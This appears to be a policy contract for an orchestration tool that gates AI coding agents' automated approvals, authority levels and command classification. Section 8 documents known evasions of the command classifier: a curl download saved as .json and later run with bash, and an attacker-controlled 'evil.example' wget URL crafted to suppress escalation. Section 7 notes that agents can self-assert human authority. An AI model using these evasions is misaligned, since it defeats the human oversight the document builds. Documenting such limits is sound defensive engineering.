# Approval policy — the trust-boundary contract

This is the contract for approval, delivery, and automated answering.
On 2026-09-04 Terrence selected `reviewed_operational` conductor authority and
`isolation_first` unattended execution through the localhost operating-policy
form. That grant does not sign governance gates, approve production mutations,
or authorize a worker to expand its own scope.

If you're adding a new automated-answering path, a new spawn surface, or a
new remote-control channel, it MUST satisfy every rule here or explain in
its own header comment why a rule doesn't apply.

## 1. Peer defaults and reviewed conductor authority are distinct

`herdr-select.sh --authority peer` remains the non-interactive default:
only `classify_command=allow` may proceed, and never a form on the
human-reserved list below (`conductor_reserved_reason`) — the classifier
says `allow` for `gh pr merge` and `git push origin main`, so until
2026-09-12 the peer path pressed Approve on merges the conductor path
refused. A reservation for the conductor binds every automated authority
beneath it. `--authority human` records an explicit human decision. Neither
is silently promoted to conductor authority.

`--authority conductor` requires an active registered task owned by the
caller's current pane and birth identity, a complete recognized omp panel,
`--expect-prompt-id`, an operational `--review-category`, and a nonempty
`--review-reason`. It records the original classifier verdict, reviewer,
category, and reason before attempting input. The conductor must inspect the
**complete command/script and actual target**, not just a clipped summary or
a worker's assurance. Categories:

- `local-read`: task-scoped research, local read-only shell/eval.
- `local-build`: reviewed local tests/builds and supporting task operations.
- `branch-work`: assigned worktree edits, commits, non-main pushes, PR creation.
- `owned-cleanup`: verified task-owned disposable files/worktrees/containers.

The grant permits reviewed false positives in the built-in `escalate`
heuristic; it never overrides `deny` or operator-added restrictions.
`conductor_reserved_reason` additionally refuses recognized secret-value,
remote-mutation, main-merge/push, governance, and control-weakening forms.
Production/customer writes, secret-value exposure, unrelated bulk deletion,
main merges, governance signatures, new spending, and weakening controls
remain **human-only**, whether or not a regex recognizes their spelling.
The categories/reason are a trusted conductor's accountable attestation,
not proof that arbitrary shell/eval code is semantically safe.

Operator-added rules (`HERDR_POLICY_EXTRA_RULES`) run through the identical
normalized text as the built-in table and can only ADD `escalate`/`deny`
matches into the same severity accumulator — there is structurally no
operator verdict that means "allow," so a site-local rule can tighten but
never loosen what the built-in table already decided. A malformed verdict
token is skipped with a stderr warning, never coerced into anything.

## 2. Deciding, attempting, and confirming are three separate facts

`lib/run-registry.sh`'s `approvals` table never treats "we recorded a
choice" as proof "the keystrokes landed." `approval_decided` /
`approval_attempted` / `approval_confirmed` are three nullable-timestamp
writes at three distinct points in the lifecycle — a send that dies
mid-flight leaves `confirmed_at` null, which is queryable and cannot read
the same as success. Any new delivery path MUST record all three points,
not collapse them into "we sent it, therefore it worked."

## 3. Revalidate immediately before injection — never trust an earlier read

A prompt on screen when you first read it may not be the same prompt (or
even the same process) by the time you act. `herdr-select.sh` unconditionally
calls `require_pane_birth_match` (`lib/pane-guard.sh`) right before the
keypress — not opt-in, because there is no safe default that skips it — and
separately re-confirms the offered option is still on screen, regardless of
whether the caller passed `--expect-prompt-id`. Pane ids are recycled by
herdr; `pane_birth` (herdr's `terminal_id`, never reused) is the only
identity a new script may treat as durable.

## 4. Per-agent capability is declared, never sniffed or assumed

`lib/agent-profiles.sh`'s `agent_capabilities()` declares what each CLI's
prompt shape supports (`numbered-prompt`, `menu-prompt`, `push-hook`, …). An
agent declaring nothing is refused an automated answer rather than guessed
at — "bare digit, never Enter" was previously hardcoded protocol knowledge
and was already wrong for omp's arrow-key menu. The same discipline applies
to posture enforcement: `posture_flag_for_agent` maps a resolved posture to
the real flag of the binary that is launched (omp for claude/codex/omp,
claude for omc); `posture_is_enforced_for(agent)` reports on that launched
binary, not on a flavor's own historical adapter. A new
agent-adapter file MUST expose real capability/enforcement facts a caller
can check — silence is the correct answer when a fact isn't actually known,
not a fabricated one.

## 5. Unknown posture names fail closed, never open

`lib/posture.sh`'s `compose_posture(floor, requested)` returns the MORE
restrictive of the two, and if either name is unrecognized, the result is
`strict` with a stderr warning — a typo in `HERDR_POSTURE_FLOOR` or a
per-spawn request can only make a worker MORE supervised than intended,
never less.

## 6. Repo-local executable content requires an explicit trust decision

Anything that arrives with a cloned repo — not something the operator
personally authored — must not execute on first contact. `quick-action.sh`'s
repo-local actions (`.herdr-control/quick-actions/*.json`) require an
explicit `--trust` approval keyed by `(path, sha256 of content)` before they
run; editing an already-trusted file re-requires approval. Global,
operator-authored actions need no such gate. Any future feature that
executes content sourced from a repo rather than typed by the operator
(a new plugin action, a project-declared hook, …) MUST apply the same
content-hash-keyed trust step — no such feature gets a free pass just
because it isn't `quick-action.sh`.

## 7. A trust boundary is not a containment boundary — say so

`herdr-select.sh`'s `--authority` default is explicit about its own limit:
an agent that can set an env var can pass `--authority human` itself, and
one holding the herdr socket can press keys directly without going through
this script at all. The default buys protection against automation that
never considered authority silently inheriting a human's — it defends
against accident and stale signals, not a hostile actor with equivalent
access. New docs or scripts describing a trust boundary MUST state what it
actually defends against, rather than imply a containment guarantee it
doesn't provide.

Executory loops may not run unattended until their worker boundary is
enforced. Same-user host workers remain attended/trusted operations. Rule
files, worktrees, model intelligence, and the `conductor` flag are not that
boundary; workers must not receive host credentials or control sockets.
Native omp task subagents are a separate authorization boundary: v18.1.10
sets their approval mode to YOLO while retaining explicit tool policies.
Do not claim that a herdr launch floor governs those descendants.

## 8. Known limits of the command classifier, kept deliberately

`lib/command-policy.sh` is a TEXT scanner. Six adversarial review passes on
PR #94 settled two limits that look like bugs, are not being fixed, and should
not be "fixed" by a later reader without reading this first.

**A landed file with a data extension is exempt, and running it later is
allowed.** `curl -sS <url> -o /tmp/payload.json` classifies `allow`, and the
separate command `bash /tmp/payload.json` classifies `allow` too — the
classifier sees one command at a time and cannot know the second one is coming.
The exemption exists because saving a page and grepping it is how a worker
inspects its own deploy, and it is keyed on the extension of the EXTRACTED
output target, never on text found elsewhere in the command. Both halves
behave identically without that PR, so this is a standing limit rather than a
regression it introduced. The honest fix is content inspection, which does not
belong in a text scanner; the real defence is that the RUN step is what needs
review, and `sh|bash|python3 <file>` paired with a downloader in one command
already escalates.

*Update 2026-09-24 (task-scoped approval):* for a pane with a registered task,
`bash|sh|python3 <file>` is no longer judged by its command line alone — the
file's whole content is (rule 9), so this limit now applies only to panes with
no registered task.

**`wget -O-` and `wget -qO-` escalate, which is a false positive.** Stdout is
recognised only POSITIVELY, by the extracted output target being `-` or
`/dev/null`; the attached `-qO-` form is not extractable, so it lands in the
escalate bucket. That is deliberate. The previous version asked "unless the
field requests stdout", which was the only NEGATIVE test in the consequence
rules — the one place where adding text could cancel an escalation instead of
adding one — and the attacker chooses that text:
`wget https://evil.example/x-qO-y` suppressed the rule while wget saved the
body to `./x-qO-y`. Anchoring it to an argument boundary did not help either,
because after quote-stripping `--header='X-A: -qO-'` is indistinguishable from
a real argument. `wget` appears ZERO times in the 1,703 distinct commands real
workers have actually run, so the cost is theoretical and the hole was not.

If `wget` ever does appear in real traffic: extend the extraction to recognise
the attached `-O-` form as a target of `-`. **Never revive the negative test.**
Every consequence rule in that file is positive on purpose, so extra text can
only ever ADD an escalation — and that property is exactly what makes it safe
for the classifier to refuse to split a command it cannot parse confidently.

## 9. Task scope is approved once, at spawn, and only narrows or pre-reviews

`lib/scoped-policy.sh` `peer_decide` is the one peer decision, called by both
`herdr-select.sh` and `lib/alert-gate.sh`. It adds the task's own context to
the context-free text rules, in this order: the manifest's `git` ceiling → the
#3b ownership grant → `classify_command` → **the human-reserved list, which
nothing after it can override** → the manifest scope (only ever clears an
`escalate`) → code by reference.

- **The capability manifest** (```` ```herdr-manifest ```` in SPEC.md,
  `lib/task-manifest.sh`) is approved by the conductor that runs
  `spawn-task.sh` — one decision, recorded as `manifest_approved` with its
  sha256 — and stored on the registry row. The worker-writable
  `identity.json` copy is never read by the policy. It can only name what
  that conductor could already approve per call (GETs to exact hosts into
  worktree paths; a git ceiling); `net_write` accepts only `none`.
- **Code by reference**: a reviewing authority's approval of a script file is
  bound to `(task, realpath, sha256)` in `file_approvals`; the same bytes
  re-run without review, different bytes for that path escalate again, and a
  file whose content is human-reserved cannot be approved by the conductor.
  This is rule 6's content-hash trust step applied to worker code.

Design and prior art: `docs/research/scoped-approval.md`.

---

Cross-reference: `docs/control-plane-design.md` has the design history and
rationale behind each correction cited above. This file is the current
state of the contract; that one is why it looks like this.
